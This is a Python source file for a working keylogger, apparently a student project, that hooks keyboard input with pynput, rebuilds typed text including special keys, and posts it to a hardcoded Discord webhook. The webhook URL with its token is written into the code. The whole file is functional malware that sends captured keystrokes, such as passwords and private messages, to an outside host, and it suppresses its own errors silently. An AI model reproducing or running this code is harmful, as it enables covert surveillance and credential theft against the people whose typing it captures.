import os
import sys
import time
import threading
from pynput import keyboard
import requests
import signal
import atexit

WEBHOOK_URL = "https://discord.com/api/webhooks/1417432108422529075/3i7F4pkyuta0uzg7lXkOx4Ht9_Qq_BvK3khzs-9mEJxeGtyiEl_PNWkcEZwHla6-73AO"
CURRENT_TEXT = ""
LAST_KEY_TIME = time.time()
CAPS_LOCK = False
SHUTDOWN_FLAG = False

if __name__ == "__main__":
    print("             _   _            _      ")
    print("            | | (_)          (_)     ")
    print("   ___ _   _| |_ _  ___ _ __  _  ___ ")
    print("  / __| | | | __| |/ _ \\ '_ \\| |/ _ \\")
    print(" | (__| |_| | |_| |  __/ |_) | |  __/")
    print("  \\___|\\__,_|\\__|_|\\___| .__/|_|\\___|")
    print("                       | |           ")
    print("                       |_|           ")
    print()
    print("[*] Developed by: BSIT 3H STUDENTS")
    print("[*] School: Camarines Sur Polytechinic Colleges")
    print("[*] Address: Nabua, Camarines Sur")
    
def send_to_discord(message):
    if not WEBHOOK_URL or not message:
        return
    try:
        data = {'content': message}
        requests.post(WEBHOOK_URL, json=data, timeout=5)
    except:
        pass

def cleanup():
    """Cleanup function to handle graceful termination"""
    global SHUTDOWN_FLAG
    
    if SHUTDOWN_FLAG:
        return  # Prevent multiple executions
    
    SHUTDOWN_FLAG = True
    
    # Send final message before exiting
    if CURRENT_TEXT:
        send_to_discord(f"FINAL TEXT BEFORE EXIT: {CURRENT_TEXT}")
    
    send_to_discord("Keylogger terminated by user")
    print("\n[*] Keylogger is shutting down...")
    
    # Close the keyboard listener if it exists
    if 'keyboard_listener' in globals() and keyboard_listener.is_alive():
        keyboard_listener.stop()

def signal_handler(sig, frame):
    """Handle termination signals"""
    cleanup()
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C
signal.signal(signal.SIGTERM, signal_handler)  # Termination signal

# Register cleanup function to run at exit
atexit.register(cleanup)

def process_text():
    global CURRENT_TEXT
    while not SHUTDOWN_FLAG:
        try:
            if CURRENT_TEXT and time.time() - LAST_KEY_TIME > 5:
                send_to_discord(f"TYPED TEXT: {CURRENT_TEXT}")
                CURRENT_TEXT = ""
            
            time.sleep(2)
        except Exception as e:
            # If there's an error in the processing thread, continue silently
            if not SHUTDOWN_FLAG:
                time.sleep(2)

def on_press(key):
    global CURRENT_TEXT, LAST_KEY_TIME, CAPS_LOCK
    
    if SHUTDOWN_FLAG:
        return False
    
    LAST_KEY_TIME = time.time()
    
    try:
        if key == keyboard.Key.caps_lock:
            CAPS_LOCK = not CAPS_LOCK
        
        elif key == keyboard.Key.space:
            CURRENT_TEXT += ' '
        
        elif key == keyboard.Key.enter:
            send_to_discord(f"TYPED TEXT: {CURRENT_TEXT}")
            CURRENT_TEXT = ""
        
        elif key == keyboard.Key.backspace:
            if CURRENT_TEXT:
                CURRENT_TEXT = CURRENT_TEXT[:-1]
        
        elif hasattr(key, 'char') and key.char:
            if CAPS_LOCK:
                CURRENT_TEXT += key.char.upper()
            else:
                CURRENT_TEXT += key.char
        
        else:
            # Handle other special keys
            special_keys = {
                keyboard.Key.tab: '[TAB]',
                keyboard.Key.esc: '[ESC]',
                keyboard.Key.f1: '[F1]',
                keyboard.Key.f2: '[F2]',
                keyboard.Key.f3: '[F3]',
                keyboard.Key.f4: '[F4]',
                keyboard.Key.f5: '[F5]',
                keyboard.Key.f6: '[F6]',
                keyboard.Key.f7: '[F7]',
                keyboard.Key.f8: '[F8]',
                keyboard.Key.f9: '[F9]',
                keyboard.Key.f10: '[F10]',
                keyboard.Key.f11: '[F11]',
                keyboard.Key.f12: '[F12]',
                keyboard.Key.delete: '[DEL]',
                keyboard.Key.insert: '[INS]',
                keyboard.Key.home: '[HOME]',
                keyboard.Key.end: '[END]',
                keyboard.Key.page_up: '[PGUP]',
                keyboard.Key.page_down: '[PGDN]',
                keyboard.Key.up: '[UP]',
                keyboard.Key.down: '[DOWN]',
                keyboard.Key.left: '[LEFT]',
                keyboard.Key.right: '[RIGHT]',
            }
            if key in special_keys:
                CURRENT_TEXT += special_keys[key]
                
    except Exception as e:
        # If there's an error in the key press handler, continue silently
        pass

try:
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()

    threading.Thread(target=process_text, daemon=True).start()

    print("[*] Keylogger is now running. Press Ctrl+C to stop.")
    
    # Keep the main thread alive
    while not SHUTDOWN_FLAG:
        time.sleep(1)
        
except Exception as e:
    # Handle any uncaught exceptions in the main thread
    cleanup()
finally:
    cleanup()
